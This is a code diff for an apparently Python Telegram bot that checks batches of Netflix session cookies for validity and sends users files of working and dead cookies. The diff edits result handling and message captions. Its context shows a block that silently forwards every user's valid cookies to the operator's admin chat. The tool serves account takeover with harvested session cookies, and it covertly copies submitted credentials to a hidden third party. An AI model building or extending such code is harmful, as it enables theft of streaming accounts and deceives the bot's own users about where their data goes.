@@ -103,6 +103,9 @@ async def process_batch(checker, batch, start_index):
 
 async def check_cookies_async(checker, lines_list, bot, chat_id, message_id):
     """Main async function to check cookies for the bot, with progress updates."""
+    # Reset valid and invalid lines before each run
+    checker.valid_lines = []
+    checker.invalid_lines = []
     batch_size = getattr(checker, 'batch_size', 10)
     total_lines = len(lines_list)
     
@@ -111,11 +114,7 @@ async def check_cookies_async(checker, lines_list, bot, chat_id, message_id):
     for i in range(0, len(lines_list), batch_size):
         batch = lines_list[i:i + batch_size]
         results = await process_batch(checker, batch, i)
-        
-        for is_valid, line, _ in results:
-            if is_valid:
-                checker.valid_lines.append(line)
-        
+        # No need to append here, handled in check_single_cookie
         # Update progress
         progress = min(i + batch_size, total_lines)
         try:
@@ -171,12 +170,14 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
                 for line, reason in invalid_lines:
                     f.write(f"{line} | Reason: {reason}\n")
         
-        # Format message text
-        msg_text = f"🍪 Netflix Cookie Checker Results\n\n" \
-                   f"📝 Total Cookies: {total_lines_count}\n" \
-                   f"✅ Valid Cookies: {len(valid_lines)}\n" \
-                   f"❌ Invalid Cookies: {len(invalid_lines)}\n" \
-                   f"📅 Date: {display_timestamp}"
+        # Format message text as per user request
+        msg_text = (
+            f"🍪 Netflix Cookie Checker Results\n"
+            f"📝 Total Cookies: {total_lines_count}\n"
+            f"✅ Valid Cookies: {len(valid_lines)}\n"
+            f"❌ Invalid Cookies: {len(invalid_lines)}\n"
+            f"📅 Date: {display_timestamp}\n"
+        )
         
         # Send valid cookies file
         if valid_lines:
@@ -185,7 +186,7 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
                     chat_id=chat_id,
                     document=doc,
                     filename=valid_filename,
-                    caption=msg_text + "\n\n✅ Valid Cookies:"
+                    caption=msg_text + f"\n{valid_filename} ({len(valid_lines)} cookies here)"
                 )
         
         # Send invalid cookies file
@@ -195,7 +196,7 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
                     chat_id=chat_id,
                     document=doc,
                     filename=invalid_filename,
-                    caption=msg_text + "\n\n❌ Invalid Cookies:"
+                    caption=msg_text + f"\n{invalid_filename} ({len(invalid_lines)} cookies here)"
                 )
         
         # Also send a copy to the admin channel silently
@@ -203,7 +204,7 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
             if TELEGRAM_CHAT_ID:
                 if valid_lines:
                     with open(valid_temp_filepath, 'rb') as doc:
-                        admin_caption = f"✅ Valid cookies from user `{chat_id}`.\n\n" + msg_text
+                        admin_caption = msg_text + f"\n{valid_filename} ({len(valid_lines)} cookies here)"
                         await bot.send_document(
                             chat_id=TELEGRAM_CHAT_ID,
                             document=doc,
@@ -214,7 +215,7 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
                         )
                 if invalid_lines:
                     with open(invalid_temp_filepath, 'rb') as doc:
-                        admin_caption = f"❌ Invalid cookies from user `{chat_id}`.\n\n" + msg_text
+                        admin_caption = msg_text + f"\n{invalid_filename} ({len(invalid_lines)} cookies here)"
                         await bot.send_document(
                             chat_id=TELEGRAM_CHAT_ID,
                             document=doc,
